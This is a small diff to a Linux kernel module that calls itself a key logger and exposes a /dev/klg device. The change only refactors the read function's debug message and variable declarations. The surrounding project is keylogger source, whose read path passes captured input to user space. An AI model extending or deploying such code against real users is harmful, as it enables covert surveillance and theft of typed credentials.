@@ -47,12 +47,15 @@ int klg_open(struct inode *inode, struct file *filp) {
 ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { 
 
 	#if(LOUD > 0)
-	printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");
+	printk(KERN_DEBUG "[Key logger]: Reading /dev/%s\n", DEV_NAME);
 	#endif
 
-	char* p = buffer;
-	int bytes = 0;
+	int bytes;
         int ret;
+	char *p; 
+        
+        p = buffer;
+        bytes = 0;
 	while(*p != '\0') {
 		bytes++;
 		p++;
